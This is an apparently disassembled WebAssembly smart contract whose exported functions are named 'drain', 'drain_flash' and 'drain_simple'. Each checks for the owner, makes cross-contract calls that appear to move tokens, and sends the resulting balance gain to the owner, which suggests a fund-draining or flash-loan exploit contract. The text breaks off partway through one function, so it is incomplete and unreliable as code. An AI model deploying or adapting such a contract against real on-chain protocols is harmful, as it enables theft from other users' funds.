(module
  (type (;0;) (func (param i64 i64) (result i64)))
  (type (;1;) (func (param i64) (result i64)))
  (type (;2;) (func (result i64)))
  (type (;3;) (func (param i64 i64 i64) (result i64)))
  (type (;4;) (func (param i32)))
  (type (;5;) (func (param i32 i32 i32)))
  (type (;6;) (func (param i32 i32) (result i64)))
  (type (;7;) (func (param i64 i64 i64 i64 i64 i64) (result i64)))
  (type (;8;) (func (param i32 i64)))
  (type (;9;) (func (param i64 i64) (result i32)))
  (type (;10;) (func (param i32 i64 i64)))
  (type (;11;) (func (result i32)))
  (type (;12;) (func (param i64 i64 i64 i64 i64 i32)))
  (type (;13;) (func (param i32 i64 i64 i64)))
  (type (;14;) (func (param i64 i64 i64 i64 i64)))
  (type (;15;) (func))
  (type (;16;) (func (param i64 i64 i64 i64 i64) (result i64)))
  (type (;17;) (func (param i64 i64 i64 i64) (result i64)))
  (type (;18;) (func (param i64 i64 i64)))
  (type (;19;) (func (param i32 i64 i64 i32)))
  (type (;20;) (func (param i32 i64 i64 i64 i64)))
  (import "l" "0" (func (;0;) (type 0)))
  (import "l" "1" (func (;1;) (type 0)))
  (import "a" "0" (func (;2;) (type 1)))
  (import "x" "7" (func (;3;) (type 2)))
  (import "d" "_" (func (;4;) (type 3)))
  (import "v" "_" (func (;5;) (type 2)))
  (import "m" "9" (func (;6;) (type 3)))
  (import "l" "_" (func (;7;) (type 3)))
  (import "v" "g" (func (;8;) (type 0)))
  (import "i" "8" (func (;9;) (type 1)))
  (import "i" "7" (func (;10;) (type 1)))
  (import "i" "6" (func (;11;) (type 0)))
  (import "b" "j" (func (;12;) (type 0)))
  (import "x" "3" (func (;13;) (type 2)))
  (import "x" "0" (func (;14;) (type 0)))
  (memory (;0;) 17)
  (global (;0;) (mut i32) i32.const 1048576)
  (global (;1;) i32 i32.const 1048668)
  (global (;2;) i32 i32.const 1048672)
  (export "memory" (memory 0))
  (export "drain" (func 19))
  (export "drain_flash" (func 32))
  (export "drain_simple" (func 34))
  (export "exec_op" (func 35))
  (export "initialize" (func 36))
  (export "recover" (func 37))
  (export "_" (func 39))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2))
  (func (;15;) (type 4) (param i32)
    (local i64 i64)
    i64.const 0
    local.set 1
    block ;; label = @1
      block ;; label = @2
        call 16
        local.tee 2
        i64.const 2
        call 0
        i64.const 1
        i64.ne
        br_if 0 (;@2;)
        local.get 2
        i64.const 2
        call 1
        local.tee 1
        i64.const 255
        i64.and
        i64.const 77
        i64.ne
        br_if 1 (;@1;)
        local.get 0
        local.get 1
        i64.store offset=8
        i64.const 1
        local.set 1
      end
      local.get 0
      local.get 1
      i64.store
      return
    end
    unreachable
  )
  (func (;16;) (type 2) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 0
    global.set 0
    local.get 0
    i32.const 1048576
    i32.const 5
    call 17
    block ;; label = @1
      local.get 0
      i32.load
      i32.const 1
      i32.ne
      br_if 0 (;@1;)
      unreachable
    end
    local.get 0
    local.get 0
    i64.load offset=8
    i64.store
    local.get 0
    i32.const 1
    call 18
    local.set 1
    local.get 0
    i32.const 16
    i32.add
    global.set 0
    local.get 1
  )
  (func (;17;) (type 5) (param i32 i32 i32)
    (local i64 i32 i32 i32 i32)
    block ;; label = @1
      block ;; label = @2
        local.get 2
        i32.const 9
        i32.gt_u
        br_if 0 (;@2;)
        i64.const 0
        local.set 3
        local.get 2
        local.set 4
        local.get 1
        local.set 5
        loop ;; label = @3
          block ;; label = @4
            local.get 4
            br_if 0 (;@4;)
            local.get 3
            i64.const 8
            i64.shl
            i64.const 14
            i64.or
            local.set 3
            br 3 (;@1;)
          end
          i32.const 1
          local.set 6
          block ;; label = @4
            local.get 5
            i32.load8_u
            local.tee 7
            i32.const 95
            i32.eq
            br_if 0 (;@4;)
            block ;; label = @5
              block ;; label = @6
                local.get 7
                i32.const -48
                i32.add
                i32.const 255
                i32.and
                i32.const 10
                i32.lt_u
                br_if 0 (;@6;)
                local.get 7
                i32.const -65
                i32.add
                i32.const 255
                i32.and
                i32.const 26
                i32.lt_u
                br_if 1 (;@5;)
                local.get 7
                i32.const -97
                i32.add
                i32.const 255
                i32.and
                i32.const 26
                i32.ge_u
                br_if 4 (;@2;)
                local.get 7
                i32.const -59
                i32.add
                local.set 6
                br 2 (;@4;)
              end
              local.get 7
              i32.const -46
              i32.add
              local.set 6
              br 1 (;@4;)
            end
            local.get 7
            i32.const -53
            i32.add
            local.set 6
          end
          local.get 3
          i64.const 6
          i64.shl
          local.get 6
          i64.extend_i32_u
          i64.const 255
          i64.and
          i64.or
          local.set 3
          local.get 4
          i32.const -1
          i32.add
          local.set 4
          local.get 5
          i32.const 1
          i32.add
          local.set 5
          br 0 (;@3;)
        end
      end
      local.get 1
      i64.extend_i32_u
      i64.const 32
      i64.shl
      i64.const 4
      i64.or
      local.get 2
      i64.extend_i32_u
      i64.const 32
      i64.shl
      i64.const 4
      i64.or
      call 12
      local.set 3
    end
    local.get 0
    i64.const 0
    i64.store
    local.get 0
    local.get 3
    i64.store offset=8
  )
  (func (;18;) (type 6) (param i32 i32) (result i64)
    local.get 0
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    local.get 1
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    call 8
  )
  (func (;19;) (type 7) (param i64 i64 i64 i64 i64 i64) (result i64)
    (local i32 i64 i64 i64 i64 i64 i32 i32 i64)
    global.get 0
    i32.const 80
    i32.sub
    local.tee 6
    global.set 0
    block ;; label = @1
      local.get 0
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 1
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 2
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 3
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 6
      i32.const 48
      i32.add
      local.get 4
      call 20
      local.get 6
      i32.load offset=48
      i32.const 1
      i32.eq
      br_if 0 (;@1;)
      local.get 6
      i64.load offset=72
      local.set 7
      local.get 6
      i64.load offset=64
      local.set 8
      local.get 6
      i32.const 48
      i32.add
      local.get 5
      call 20
      local.get 6
      i32.load offset=48
      i32.const 1
      i32.eq
      br_if 0 (;@1;)
      local.get 6
      i64.load offset=72
      local.set 5
      local.get 6
      i64.load offset=64
      local.set 9
      local.get 0
      call 2
      drop
      local.get 6
      i32.const 48
      i32.add
      call 15
      block ;; label = @2
        local.get 6
        i32.load offset=48
        i32.eqz
        br_if 0 (;@2;)
        block ;; label = @3
          local.get 0
          local.get 6
          i64.load offset=56
          call 21
          i32.eqz
          br_if 0 (;@3;)
          local.get 6
          i32.const 48
          i32.add
          local.get 2
          call 3
          local.tee 4
          call 22
          local.get 6
          i64.load offset=56
          local.set 10
          local.get 6
          i64.load offset=48
          local.set 11
          block ;; label = @4
            call 23
            local.tee 12
            i32.const -1001
            i32.gt_u
            br_if 0 (;@4;)
            local.get 2
            local.get 4
            local.get 1
            local.get 8
            local.get 7
            local.get 12
            i32.const 1000
            i32.add
            local.tee 13
            call 24
            local.get 6
            local.get 8
            local.get 7
            call 25
            local.tee 8
            i64.store offset=16
            i64.const 2
            local.set 7
            i32.const 1
            local.set 12
            block ;; label = @5
              loop ;; label = @6
                local.get 12
                i32.eqz
                br_if 1 (;@5;)
                local.get 12
                i32.const -1
                i32.add
                local.set 12
                local.get 8
                local.set 7
                br 0 (;@6;)
              end
            end
            local.get 6
            local.get 7
            i64.store offset=48
            i32.const 1
            local.set 12
            local.get 6
            i32.const 48
            i32.add
            i32.const 1
            call 18
            local.set 14
            local.get 6
            i64.const 0
            i64.const 0
            call 25
            local.tee 8
            i64.store offset=16
            i64.const 2
            local.set 7
            block ;; label = @5
              loop ;; label = @6
                local.get 12
                i32.eqz
                br_if 1 (;@5;)
                local.get 12
                i32.const -1
                i32.add
                local.set 12
                local.get 8
                local.set 7
                br 0 (;@6;)
              end
            end
            local.get 6
            local.get 7
            i64.store offset=48
            local.get 6
            i32.const 48
            i32.add
            i32.const 1
            call 18
            local.set 7
            i32.const 1048634
            i32.const 7
            call 26
            local.set 8
            local.get 6
            i64.const 0
            i64.store offset=40
            local.get 6
            local.get 4
            i64.store offset=32
            local.get 6
            local.get 7
            i64.store offset=24
            local.get 6
            local.get 14
            i64.store offset=16
            i32.const 0
            local.set 12
            loop ;; label = @5
              block ;; label = @6
                local.get 12
                i32.const 32
                i32.ne
                br_if 0 (;@6;)
                i32.const 0
                local.set 12
                block ;; label = @7
                  loop ;; label = @8
                    local.get 12
                    i32.const 32
                    i32.eq
                    br_if 1 (;@7;)
                    local.get 6
                    i32.const 48
                    i32.add
                    local.get 12
                    i32.add
                    local.get 6
                    i32.const 16
                    i32.add
                    local.get 12
                    i32.add
                    i64.load
                    i64.store
                    local.get 12
                    i32.const 8
                    i32.add
                    local.set 12
                    br 0 (;@8;)
                  end
                end
                local.get 1
                local.get 8
                local.get 6
                i32.const 48
                i32.add
                i32.const 4
                call 18
                call 4
                drop
                local.get 2
                local.get 4
                local.get 3
                local.get 9
                local.get 5
                local.get 13
                call 24
                i32.const 1048662
                i32.const 6
                call 26
                local.set 7
                local.get 6
                local.get 9
                local.get 5
                call 25
                i64.store offset=40
                local.get 6
                local.get 2
                i64.store offset=32
                local.get 6
                local.get 4
                i64.store offset=24
                local.get 6
                local.get 4
                i64.store offset=16
                i32.const 0
                local.set 12
                loop ;; label = @7
                  block ;; label = @8
                    local.get 12
                    i32.const 32
                    i32.ne
                    br_if 0 (;@8;)
                    i32.const 0
                    local.set 12
                    block ;; label = @9
                      loop ;; label = @10
                        local.get 12
                        i32.const 32
                        i32.eq
                        br_if 1 (;@9;)
                        local.get 6
                        i32.const 48
                        i32.add
                        local.get 12
                        i32.add
                        local.get 6
                        i32.const 16
                        i32.add
                        local.get 12
                        i32.add
                        i64.load
                        i64.store
                        local.get 12
                        i32.const 8
                        i32.add
                        local.set 12
                        br 0 (;@10;)
                      end
                    end
                    local.get 3
                    local.get 7
                    local.get 6
                    i32.const 48
                    i32.add
                    i32.const 4
                    call 18
                    call 4
                    drop
                    local.get 1
                    i32.const 1048641
                    i32.const 6
                    call 26
                    call 5
                    call 4
                    drop
                    i32.const 1048647
                    i32.const 7
                    call 26
                    local.set 8
                    local.get 6
                    local.get 4
                    i64.store offset=16
                    i64.const 2
                    local.set 7
                    i32.const 1
                    local.set 12
                    block ;; label = @9
                      loop ;; label = @10
                        local.get 12
                        i32.eqz
                        br_if 1 (;@9;)
                        local.get 12
                        i32.const -1
                        i32.add
                        local.set 12
                        local.get 4
                        local.set 7
                        br 0 (;@10;)
                      end
                    end
                    local.get 6
                    local.get 7
                    i64.store offset=48
                    i32.const 1
                    local.set 12
                    local.get 6
                    local.get 1
                    local.get 8
                    local.get 6
                    i32.const 48
                    i32.add
                    i32.const 1
                    call 18
                    call 27
                    local.get 6
                    i64.const 0
                    i64.const 0
                    call 25
                    local.tee 8
                    i64.store offset=16
                    i64.const 2
                    local.set 7
                    block ;; label = @9
                      loop ;; label = @10
                        local.get 12
                        i32.eqz
                        br_if 1 (;@9;)
                        local.get 12
                        i32.const -1
                        i32.add
                        local.set 12
                        local.get 8
                        local.set 7
                        br 0 (;@10;)
                      end
                    end
                    local.get 6
                    local.get 7
                    i64.store offset=48
                    local.get 6
                    i32.const 48
                    i32.add
                    i32.const 1
                    call 18
                    local.set 7
                    i32.const 1048654
                    i32.const 8
                    call 26
                    local.set 8
                    local.get 6
                    i64.load
                    local.get 6
                    i64.load offset=8
                    call 25
                    local.set 14
                    local.get 6
                    local.get 4
                    i64.store offset=32
                    local.get 6
                    local.get 7
                    i64.store offset=24
                    local.get 6
                    local.get 14
                    i64.store offset=16
                    i32.const 0
                    local.set 12
                    loop ;; label = @9
                      block ;; label = @10
                        local.get 12
                        i32.const 24
                        i32.ne
                        br_if 0 (;@10;)
                        i32.const 0
                        local.set 12
                        block ;; label = @11
                          loop ;; label = @12
                            local.get 12
                            i32.const 24
                            i32.eq
                            br_if 1 (;@11;)
                            local.get 6
                            i32.const 48
                            i32.add
                            local.get 12
                            i32.add
                            local.get 6
                            i32.const 16
                            i32.add
                            local.get 12
                            i32.add
                            i64.load
                            i64.store
                            local.get 12
                            i32.const 8
                            i32.add
                            local.set 12
                            br 0 (;@12;)
                          end
                        end
                        local.get 1
                        local.get 8
                        local.get 6
                        i32.const 48
                        i32.add
                        i32.const 3
                        call 18
                        call 4
                        drop
                        i32.const 1048654
                        i32.const 8
                        call 26
                        local.set 7
                        local.get 9
                        local.get 5
                        call 25
                        local.set 8
                        local.get 6
                        local.get 4
                        i64.store offset=40
                        local.get 6
                        local.get 8
                        i64.store offset=32
                        local.get 6
                        local.get 2
                        i64.store offset=24
                        local.get 6
                        local.get 4
                        i64.store offset=16
                        i32.const 0
                        local.set 12
                        loop ;; label = @11
                          block ;; label = @12
                            local.get 12
                            i32.const 32
                            i32.ne
                            br_if 0 (;@12;)
                            i32.const 0
                            local.set 12
                            block ;; label = @13
                              loop ;; label = @14
                                local.get 12
                                i32.const 32
                                i32.eq
                                br_if 1 (;@13;)
                                local.get 6
                                i32.const 48
                                i32.add
                                local.get 12
                                i32.add
                                local.get 6
                                i32.const 16
                                i32.add
                                local.get 12
                                i32.add
                                i64.load
                                i64.store
                                local.get 12
                                i32.const 8
                                i32.add
                                local.set 12
                                br 0 (;@14;)
                              end
                            end
                            local.get 3
                            local.get 7
                            local.get 6
                            i32.const 48
                            i32.add
                            i32.const 4
                            call 18
                            call 4
                            drop
                            local.get 6
                            i32.const 48
                            i32.add
                            local.get 2
                            local.get 4
                            call 22
                            local.get 6
                            i64.load offset=56
                            local.tee 7
                            local.get 10
                            i64.xor
                            local.get 7
                            local.get 7
                            local.get 10
                            i64.sub
                            local.get 6
                            i64.load offset=48
                            local.tee 8
                            local.get 11
                            i64.lt_u
                            i64.extend_i32_u
                            i64.sub
                            local.tee 1
                            i64.xor
                            i64.and
                            i64.const 0
                            i64.lt_s
                            br_if 8 (;@4;)
                            local.get 8
                            local.get 11
                            i64.sub
                            local.set 3
                            block ;; label = @13
                              local.get 8
                              i64.const 0
                              i64.ne
                              local.get 7
                              i64.const 0
                              i64.gt_s
                              local.get 7
                              i64.eqz
                              select
                              i32.eqz
                              br_if 0 (;@13;)
                              local.get 2
                              local.get 4
                              local.get 0
                              local.get 8
                              local.get 7
                              call 28
                            end
                            local.get 3
                            local.get 1
                            call 25
                            local.set 4
                            local.get 6
                            i32.const 80
                            i32.add
                            global.set 0
                            local.get 4
                            return
                          end
                          local.get 6
                          i32.const 48
                          i32.add
                          local.get 12
                          i32.add
                          i64.const 2
                          i64.store
                          local.get 12
                          i32.const 8
                          i32.add
                          local.set 12
                          br 0 (;@11;)
                        end
                      end
                      local.get 6
                      i32.const 48
                      i32.add
                      local.get 12
                      i32.add
                      i64.const 2
                      i64.store
                      local.get 12
                      i32.const 8
                      i32.add
                      local.set 12
                      br 0 (;@9;)
                    end
                  end
                  local.get 6
                  i32.const 48
                  i32.add
                  local.get 12
                  i32.add
                  i64.const 2
                  i64.store
                  local.get 12
                  i32.const 8
                  i32.add
                  local.set 12
                  br 0 (;@7;)
                end
              end
              local.get 6
              i32.const 48
              i32.add
              local.get 12
              i32.add
              i64.const 2
              i64.store
              local.get 12
              i32.const 8
              i32.add
              local.set 12
              br 0 (;@5;)
            end
          end
          call 29
          unreachable
        end
        i32.const 39
        call 30
        unreachable
      end
      call 31
      unreachable
    end
    unreachable
  )
  (func (;20;) (type 8) (param i32 i64)
    (local i32 i64)
    block ;; label = @1
      block ;; label = @2
        block ;; label = @3
          block ;; label = @4
            local.get 1
            i32.wrap_i64
            i32.const 255
            i32.and
            local.tee 2
            i32.const 69
            i32.eq
            br_if 0 (;@4;)
            local.get 2
            i32.const 11
            i32.ne
            br_if 2 (;@2;)
            local.get 0
            local.get 1
            i64.const 63
            i64.shr_s
            i64.store offset=24
            local.get 0
            local.get 1
            i64.const 8
            i64.shr_s
            i64.store offset=16
            br 1 (;@3;)
          end
          local.get 1
          call 9
          local.set 3
          local.get 1
          call 10
          local.set 1
          local.get 0
          local.get 3
          i64.store offset=24
          local.get 0
          local.get 1
          i64.store offset=16
        end
        i64.const 0
        local.set 1
        br 1 (;@1;)
      end
      local.get 0
      i64.const 34359740419
      i64.store offset=8
      i64.const 1
      local.set 1
    end
    local.get 0
    local.get 1
    i64.store
  )
  (func (;21;) (type 9) (param i64 i64) (result i32)
    local.get 0
    local.get 1
    call 14
    i64.eqz
  )
  (func (;22;) (type 10) (param i32 i64 i64)
    (local i32)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    i64.store offset=8
    local.get 0
    local.get 1
    i64.const 696753673873934
    local.get 3
    i32.const 8
    i32.add
    i32.const 1
    call 18
    call 27
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;23;) (type 11) (result i32)
    call 13
    i64.const 32
    i64.shr_u
    i32.wrap_i64
  )
  (func (;24;) (type 12) (param i64 i64 i64 i64 i64 i32)
    (local i32)
    global.get 0
    i32.const 64
    i32.sub
    local.tee 6
    global.set 0
    local.get 6
    local.get 3
    local.get 4
    call 25
    i64.store offset=16
    local.get 6
    local.get 2
    i64.store offset=8
    local.get 6
    local.get 1
    i64.store
    local.get 6
    local.get 5
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    i64.store offset=24
    i32.const 0
    local.set 5
    loop ;; label = @1
      block ;; label = @2
        local.get 5
        i32.const 32
        i32.ne
        br_if 0 (;@2;)
        i32.const 0
        local.set 5
        block ;; label = @3
          loop ;; label = @4
            local.get 5
            i32.const 32
            i32.eq
            br_if 1 (;@3;)
            local.get 6
            i32.const 32
            i32.add
            local.get 5
            i32.add
            local.get 6
            local.get 5
            i32.add
            i64.load
            i64.store
            local.get 5
            i32.const 8
            i32.add
            local.set 5
            br 0 (;@4;)
          end
        end
        local.get 0
        i64.const 683302978513422
        local.get 6
        i32.const 32
        i32.add
        i32.const 4
        call 18
        call 40
        local.get 6
        i32.const 64
        i32.add
        global.set 0
        return
      end
      local.get 6
      i32.const 32
      i32.add
      local.get 5
      i32.add
      i64.const 2
      i64.store
      local.get 5
      i32.const 8
      i32.add
      local.set 5
      br 0 (;@1;)
    end
  )
  (func (;25;) (type 0) (param i64 i64) (result i64)
    (local i32)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 0
    local.get 1
    call 33
    block ;; label = @1
      local.get 2
      i32.load
      i32.const 1
      i32.ne
      br_if 0 (;@1;)
      unreachable
    end
    local.get 2
    i64.load offset=8
    local.set 1
    local.get 2
    i32.const 16
    i32.add
    global.set 0
    local.get 1
  )
  (func (;26;) (type 6) (param i32 i32) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 0
    local.get 1
    call 17
    block ;; label = @1
      local.get 2
      i32.load
      i32.const 1
      i32.ne
      br_if 0 (;@1;)
      unreachable
    end
    local.get 2
    i64.load offset=8
    local.set 3
    local.get 2
    i32.const 16
    i32.add
    global.set 0
    local.get 3
  )
  (func (;27;) (type 13) (param i32 i64 i64 i64)
    (local i32)
    global.get 0
    i32.const 32
    i32.sub
    local.tee 4
    global.set 0
    local.get 4
    local.get 1
    local.get 2
    local.get 3
    call 4
    call 20
    block ;; label = @1
      local.get 4
      i32.load
      i32.const 1
      i32.ne
      br_if 0 (;@1;)
      call 29
      unreachable
    end
    local.get 4
    i64.load offset=16
    local.set 3
    local.get 0
    local.get 4
    i64.load offset=24
    i64.store offset=8
    local.get 0
    local.get 3
    i64.store
    local.get 4
    i32.const 32
    i32.add
    global.set 0
  )
  (func (;28;) (type 14) (param i64 i64 i64 i64 i64)
    (local i32 i32)
    global.get 0
    i32.const 48
    i32.sub
    local.tee 5
    global.set 0
    local.get 5
    local.get 3
    local.get 4
    call 25
    i64.store offset=16
    local.get 5
    local.get 2
    i64.store offset=8
    local.get 5
    local.get 1
    i64.store
    i32.const 0
    local.set 6
    loop ;; label = @1
      block ;; label = @2
        local.get 6
        i32.const 24
        i32.ne
        br_if 0 (;@2;)
        i32.const 0
        local.set 6
        block ;; label = @3
          loop ;; label = @4
            local.get 6
            i32.const 24
            i32.eq
            br_if 1 (;@3;)
            local.get 5
            i32.const 24
            i32.add
            local.get 6
            i32.add
            local.get 5
            local.get 6
            i32.add
            i64.load
            i64.store
            local.get 6
            i32.const 8
            i32.add
            local.set 6
            br 0 (;@4;)
          end
        end
        local.get 0
        i64.const 65154533130155790
        local.get 5
        i32.const 24
        i32.add
        i32.const 3
        call 18
        call 40
        local.get 5
        i32.const 48
        i32.add
        global.set 0
        return
      end
      local.get 5
      i32.const 24
      i32.add
      local.get 6
      i32.add
      i64.const 2
      i64.store
      local.get 6
      i32.const 8
      i32.add
      local.set 6
      br 0 (;@1;)
    end
  )
  (func (;29;) (type 15)
    call 38
    unreachable
  )
  (func (;30;) (type 4) (param i32)
    call 38
    unreachable
  )
  (func (;31;) (type 15)
    i32.const 43
    call 30
    unreachable
  )
  (func (;32;) (type 16) (param i64 i64 i64 i64 i64) (result i64)
    (local i32 i64 i64 i64 i64 i64 i32)
    global.get 0
    i32.const 80
    i32.sub
    local.tee 5
    global.set 0
    block ;; label = @1
      local.get 0
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 1
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 2
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 3
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 5
      i32.const 16
      i32.add
      local.get 4
      call 20
      local.get 5
      i32.load offset=16
      i32.const 1
      i32.eq
      br_if 0 (;@1;)
      local.get 5
      i64.load offset=40
      local.set 1
      local.get 5
      i64.load offset=32
      local.set 6
      local.get 0
      call 2
      drop
      local.get 5
      i32.const 16
      i32.add
      call 15
      block ;; label = @2
        local.get 5
        i32.load offset=16
        i32.eqz
        br_if 0 (;@2;)
        block ;; label = @3
          local.get 0
          local.get 5
          i64.load offset=24
          call 21
          i32.eqz
          br_if 0 (;@3;)
          local.get 5
          i32.const 16
          i32.add
          local.get 2
          call 3
          local.tee 4
          call 22
          local.get 5
          local.get 6
          local.get 1
          i64.const 10
          i64.const 0
          call 43
          block ;; label = @4
            local.get 1
            local.get 5
            i64.load offset=8
            local.tee 7
            i64.xor
            local.get 1
            local.get 1
            local.get 7
            i64.sub
            local.get 6
            local.get 5
            i64.load
            i64.lt_u
            i64.extend_i32_u
            i64.sub
            i64.xor
            i64.and
            i64.const 0
            i64.lt_s
            br_if 0 (;@4;)
            local.get 5
            i64.load offset=24
            local.set 7
            local.get 5
            i64.load offset=16
            local.set 8
            call 5
            local.set 9
            i32.const 1048624
            i32.const 10
            call 26
            local.set 10
            local.get 5
            i32.const 56
            i32.add
            local.get 6
            local.get 1
            call 33
            local.get 5
            i32.load offset=56
            i32.const 1
            i32.eq
            br_if 3 (;@1;)
            local.get 5
            i64.load offset=64
            local.set 1
            local.get 5
            local.get 4
            i64.store offset=32
            local.get 5
            local.get 2
            i64.store offset=24
            local.get 5
            local.get 1
            i64.store offset=16
            local.get 5
            i32.const 1048600
            i64.extend_i32_u
            i64.const 32
            i64.shl
            i64.const 4
            i64.or
            local.get 5
            i32.const 16
            i32.add
            i64.extend_i32_u
            i64.const 32
            i64.shl
            i64.const 4
            i64.or
            i64.const 12884901892
            call 6
            i64.store offset=72
            local.get 5
            local.get 9
            i64.store offset=64
            local.get 5
            local.get 4
            i64.store offset=56
            i32.const 0
            local.set 11
            loop ;; label = @5
              block ;; label = @6
                local.get 11
                i32.const 24
                i32.ne
                br_if 0 (;@6;)
                i32.const 0
                local.set 11
                block ;; label = @7
                  loop ;; label = @8
                    local.get 11
                    i32.const 24
                    i32.eq
                    br_if 1 (;@7;)
                    local.get 5
                    i32.const 16
                    i32.add
                    local.get 11
                    i32.add
                    local.get 5
                    i32.const 56
                    i32.add
                    local.get 11
                    i32.add
                    i64.load
                    i64.store
                    local.get 11
                    i32.const 8
                    i32.add
                    local.set 11
                    br 0 (;@8;)
                  end
                end
                local.get 3
                local.get 10
                local.get 5
                i32.const 16
                i32.add
                i32.const 3
                call 18
                call 4
                drop
                local.get 5
                i32.const 16
                i32.add
                local.get 2
                local.get 4
                call 22
                local.get 5
                i64.load offset=24
                local.tee 1
                local.get 7
                i64.xor
                local.get 1
                local.get 1
                local.get 7
                i64.sub
                local.get 5
                i64.load offset=16
                local.tee 6
                local.get 8
                i64.lt_u
                i64.extend_i32_u
                i64.sub
                local.tee 3
                i64.xor
                i64.and
                i64.const 0
                i64.lt_s
                br_if 2 (;@4;)
                local.get 6
                local.get 8
                i64.sub
                local.set 7
                block ;; label = @7
                  local.get 6
                  i64.const 0
                  i64.ne
                  local.get 1
                  i64.const 0
                  i64.gt_s
                  local.get 1
                  i64.eqz
                  select
                  i32.eqz
                  br_if 0 (;@7;)
                  local.get 2
                  local.get 4
                  local.get 0
                  local.get 6
                  local.get 1
                  call 28
                end
                local.get 7
                local.get 3
                call 25
                local.set 1
                local.get 5
                i32.const 80
                i32.add
                global.set 0
                local.get 1
                return
              end
              local.get 5
              i32.const 16
              i32.add
              local.get 11
              i32.add
              i64.const 2
              i64.store
              local.get 11
              i32.const 8
              i32.add
              local.set 11
              br 0 (;@5;)
            end
          end
          call 29
          unreachable
        end
        i32.const 39
        call 30
        unreachable
      end
      call 31
      unreachable
    end
    unreachable
  )
  (func (;33;) (type 10) (param i32 i64 i64)
    block ;; label = @1
      block ;; label = @2
        local.get 1
        i64.const 36028797018963968
        i64.add
        i64.const 72057594037927935
        i64.gt_u
        br_if 0 (;@2;)
        local.get 1
        local.get 1
        i64.xor
        local.get 2
        local.get 1
        i64.const 63
        i64.shr_s
        i64.xor
        i64.or
        i64.const 0
        i64.ne
        br_if 0 (;@2;)
        local.get 1
        i64.const 8
        i64.shl
        i64.const 11
        i64.or
        local.set 1
        br 1 (;@1;)
      end
      local.get 2
      local.get 1
      call 11
      local.set 1
    end
    local.get 0
    i64.const 0
    i64.store
    local.get 0
    local.get 1
    i64.store offset=8
  )
  (func (;34;) (type 17) (param i64 i64 i64 i64) (result i64)
    (local i32 i64 i64 i64 i64 i32 i64)
    global.get 0
    i32.const 80
    i32.sub
    local.tee 4
    global.set 0
    block ;; label = @1
      local.get 0
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 1
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 2
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 4
      i32.const 48
      i32.add
      local.get 3
      call 20
      local.get 4
      i32.load offset=48
      i32.const 1
      i32.eq
      br_if 0 (;@1;)
      local.get 4
      i64.load offset=72
      local.set 5
      local.get 4
      i64.load offset=64
      local.set 6
      local.get 0
      call 2
      drop
      local.get 4
      i32.const 48
      i32.add
      call 15
      block ;; label = @2
        local.get 4
        i32.load offset=48
        i32.eqz
        br_if 0 (;@2;)
        block ;; label = @3
          local.get 0
          local.get 4
          i64.load offset=56
          call 21
          i32.eqz
          br_if 0 (;@3;)
          local.get 4
          i32.const 48
          i32.add
          local.get 2
          call 3
          local.tee 3
          call 22
          local.get 4
          i64.load offset=56
          local.set 7
          local.get 4
          i64.load offset=48
          local.set 8
          block ;; label = @4
            call 23
            local.tee 9
            i32.const -1001
            i32.gt_u
            br_if 0 (;@4;)
            local.get 2
            local.get 3
            local.get 1
            local.get 6
            local.get 5
            local.get 9
            i32.const 1000
            i32.add
            call 24
            local.get 4
            local.get 6
            local.get 5
            call 25
            local.tee 6
            i64.store
            i64.const 2
            local.set 5
            i32.const 1
            local.set 9
            block ;; label = @5
              loop ;; label = @6
                local.get 9
                i32.eqz
                br_if 1 (;@5;)
                local.get 9
                i32.const -1
                i32.add
                local.set 9
                local.get 6
                local.set 5
                br 0 (;@6;)
              end
            end
            local.get 4
            local.get 5
            i64.store offset=48
            i32.const 1
            local.set 9
            local.get 4
            i32.const 48
            i32.add
            i32.const 1
            call 18
            local.set 10
            local.get 4
            i64.const 0
            i64.const 0
            call 25
            local.tee 6
            i64.store
            i64.const 2
            local.set 5
            block ;; label = @5
              loop ;; label = @6
                local.get 9
                i32.eqz
                br_if 1 (;@5;)
                local.get 9
                i32.const -1
                i32.add
                local.set 9
                local.get 6
                local.set 5
                br 0 (;@6;)
              end
            end
            local.get 4
            local.get 5
            i64.store offset=48
            local.get 4
            i32.const 48
            i32.add
            i32.const 1
            call 18
            local.set 5
            i32.const 1048634
            i32.const 7
            call 26
            local.set 6
            local.get 4
            i64.const 0
            i64.store offset=24
            local.get 4
            local.get 3
            i64.store offset=16
            local.get 4
            local.get 5
            i64.store offset=8
            local.get 4
            local.get 10
            i64.store
            i32.const 0
            local.set 9
            loop ;; label = @5
              block ;; label = @6
                local.get 9
                i32.const 32
                i32.ne
                br_if 0 (;@6;)
                i32.const 0
                local.set 9
                block ;; label = @7
                  loop ;; label = @8
                    local.get 9
                    i32.const 32
                    i32.eq
                    br_if 1 (;@7;)
                    local.get 4
                    i32.const 48
                    i32.add
                    local.get 9
                    i32.add
                    local.get 4
                    local.get 9
                    i32.add
                    i64.load
                    i64.store
                    local.get 9
                    i32.const 8
                    i32.add
                    local.set 9
                    br 0 (;@8;)
                  end
                end
